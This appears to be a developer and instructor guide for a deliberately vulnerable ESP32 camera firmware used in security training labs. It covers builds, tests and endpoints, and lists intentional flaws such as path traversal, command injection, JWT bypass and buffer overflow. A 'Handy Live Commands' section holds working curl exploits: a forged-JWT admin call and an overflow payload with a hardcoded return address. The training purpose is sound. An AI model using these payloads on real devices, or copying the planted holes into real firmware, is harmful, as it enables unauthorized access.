# Developer & Instructor Guide

This document is for developers and instructors only. It covers build environments, test frameworks, verification pipelines, and internal architecture details. Students should NOT need this file.

## Quick Verification

```bash
# 1. Run on-device Unity tests
pio test -e M5CoreS3_test -v

# 2. Flash standard firmware
pio run -e M5CoreS3 -t upload

# 3. Wait for device to boot, then run HTTP/API tests
export CORES3_BASE=http://192.168.4.1
export SKIP_PIO_TESTS=1
python3 -u unittests/test_all_labs.py
```

## Build Environments

| Environment | Purpose | Key Flags |
|-------------|---------|-----------|
| `M5CoreS3` | Standard firmware for students | `FACTORY_TEST=1` |
| `M5CoreS3_test` | Unity test firmware (use with `pio test`) | `FACTORY_TEST=1`, `UNIT_TEST`, `DEV_TEST_HOOKS` |
| `M5CoreS3_debug` | Debug firmware with `/diag` endpoint | `FACTORY_TEST=1`, `DEV_TEST_HOOKS` |

### FACTORY_TEST Macro

The `FACTORY_TEST=1` preprocessor macro (enabled by default in `platformio.ini`) gates all vulnerable code paths. Removing this flag compiles out the intentional vulnerabilities. Students do not need to know about this macro.

### DEV_TEST_HOOKS

The `DEV_TEST_HOOKS` macro enables:
- The `diag <n>` serial command (routes to `run_diagnostic(id)`)
- The `/diag?id=<n>` HTTP endpoint
- Diagnostic helper functions: `dev_generateJWT`, `dev_verifyJWT`, `dev_getJWTSecret`, etc.

These are only in the `M5CoreS3_test` and `M5CoreS3_debug` builds, never in the student firmware.

## Flashing

```bash
# Identify serial device
ls -l /dev/serial/by-id/

# Flash pre-built firmware (no toolchain needed, just esptool)
./firmware/flash.sh
./firmware/flash.sh /dev/ttyACM0  # or specify port

# Standard firmware from source (for students)
pio run -e M5CoreS3 -t upload

# Debug firmware (for instructors/CI - includes /diag endpoint)
pio run -e M5CoreS3_debug -t upload

# Serial monitor
pio device monitor -b 115200
```

Close the monitor before uploading. On Linux, ensure your user is in the `dialout` group and udev rules are installed.

## Testing

### Unity Tests (on-device)

```bash
pio test -e M5CoreS3_test -v
```

### Python HTTP/API Suite

```bash
# With device on AP (standard firmware flashed)
export CORES3_BASE=http://192.168.4.1
export CORES3_IFACE=<ap_nic>          # e.g., wlx0013eff2094e
export SKIP_PIO_TESTS=1
python3 -u unittests/test_all_labs.py
```

Without a reachable device, HTTP tests are skipped and repo checks still pass.

### Environment Variables

| Variable | Default | Purpose |
|----------|---------|---------|
| `CORES3_BASE` | `http://192.168.4.1` | Device base URL |
| `CORES3_IFACE` | (none) | Network interface to bind to |
| `CORES3_REACH_TRIES` | `12` | Reachability poll attempts |
| `SKIP_PIO_TESTS` | (unset) | Skip PlatformIO Unity tests in Python suite |
| `CORES3_DESTRUCTIVE` | (unset) | Enable tests that reboot device |

## Device Networking

### AP Mode (first boot / after factory reset)
- Device starts open AP `CoreS3-CAM-XXXX`
- Base URL: http://192.168.4.1

### Station Mode (after provisioning)
- Device connects to your WiFi
- IP printed in serial log during boot
- Set `CORES3_BASE=http://<device_ip>`

### Multiple NICs
```bash
ip route get 192.168.4.1              # find correct interface
export CORES3_IFACE=wlx0013eff2094e   # bind tests to AP NIC
```

## HTTP Endpoints

### Student firmware (M5CoreS3)

| Endpoint | Method | Auth | Lab |
|----------|--------|------|-----|
| `/config` | GET | No | L15 (leaks PINs) |
| `/file?name=` | GET | No | L09 (path traversal) |
| `/apply` | POST | No | L08 (command injection via SSID) |
| `/login` | POST | No | L10 (returns JWT) |
| `/admin` | GET | JWT | L10 (JWT-protected) |
| `/admin/status` | GET | JWT | Admin status |
| `/admin/nvs` | GET | JWT | NVS viewer |
| `/admin/reboot` | POST | JWT | Reboot |
| `/stream` | GET | JWT | L17 (`?noauth=1` bypass) |
| `/camera?exposure=` | GET | No | L11 (buffer overflow) |
| `/camera/debug-frame` | GET | No | L16 (frame buffer leak) |
| `/settings/profile` | POST | No | L13 (heap overflow) |
| `/ota` | POST | No | L07/L22 (unsigned OTA) |
| `/api/check_pin` | POST | No | L30 (timing side-channel) |
| `/api/token` | GET | No | L28 (weak RNG) |
| `/api/token/verify` | POST | No | L28 (token verify) |
| `/status` | GET | No | Device status |
| `/settings` | GET/POST | JWT | Device settings |

### Debug/test only (M5CoreS3_debug)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/diag?id=N` | GET | Diagnostic hooks for all 32 labs |

## Serial Shell Commands

### User Commands (no login required)
`help`, `login <pin>`, `logout`, `whoami`, `status`, `self-test`, `led-test`, `audio-test`, `nvs-list`, `part-list`, `reset`, `reboot`

### Admin Commands (require `login <admin_pin>`)
`wifi <ssid> <pw>`, `nvs-clear`, `nvs-dump`, `memdump <addr> <len>`, `flashdump <addr> <len>`, `partdump <name>`, `usb-cmd <cmd>`, `usb-dfu <size>`, `bus-diag`, `bus-stress`, `forensics-snap`, `crash-dump`

### Hidden Commands (discoverable via firmware RE)
`usb-memleak`, `usb-auth <password>`, `heap-test`, `pin-test`

### DEV_TEST_HOOKS Commands (debug/test builds only)
`diag <n>`, `fmt-check`, `csrf-check`, `wifi-deauth`, `mdns-check`, `secureboot-check`, `flashcrypt-check`

## Handy Live Commands

```bash
# L10: Admin access with forged JWT
TOK=$(python3 docs/labs/L10-weak-jwt/tools/forge_jwt.py forge --secret secret123 --user admin --role admin)
curl -sS -H "Authorization: Bearer $TOK" http://192.168.4.1/admin

# L17: Stream headers check
curl -sS -m 2 -D - -o /dev/null "http://192.168.4.1/stream?noauth=1"

# L11: Buffer overflow (unlockAdmin@0x4200D374)
curl -s "http://192.168.4.1/camera?exposure=$(python3 -c "from urllib.parse import quote_from_bytes; import struct; print(quote_from_bytes(b'A'*64 + struct.pack('<I', 0x4200D374)))")"
```

## Provided Tools

| Tool | Location | Purpose |
|------|----------|---------|
| `forge_jwt.py` | `docs/labs/L10-weak-jwt/tools/` | JWT forge/verify/decode |
| `bin2elf.py` | `docs/labs/L04-firmware-extraction/tools/` | Convert ESP32 .bin to ELF for Ghidra |
| `test_all_labs.py` | `unittests/` | Python HTTP/API test suite |
| `test_main.cpp` | `test/test_device_labs/` | Unity on-device tests |

## Troubleshooting

- **"Device not reachable"**: Check NIC with `ip route get 192.168.4.1`, set `CORES3_IFACE`
- **Factory reset**: `nvs-clear` (requires admin) then `reboot` in serial shell
- **Serial port**: `ls -l /dev/serial/by-id/` to find correct port after flash

## Contributing

When adding new labs:
1. Implement vulnerability in firmware under `#ifdef FACTORY_TEST`
2. Add diagnostic hook in `CameraDevice_Diag.cpp`
3. Add Unity test in `test/test_device_labs/test_main.cpp`
4. Add Python test in `unittests/test_all_labs.py`
5. Write lab README following `SIMPLIFY_TEMPLATE.md`
6. Update `docs/labs/LABS.md` index
7. Do NOT put lab numbers or "VULNERABILITY:" labels in firmware source
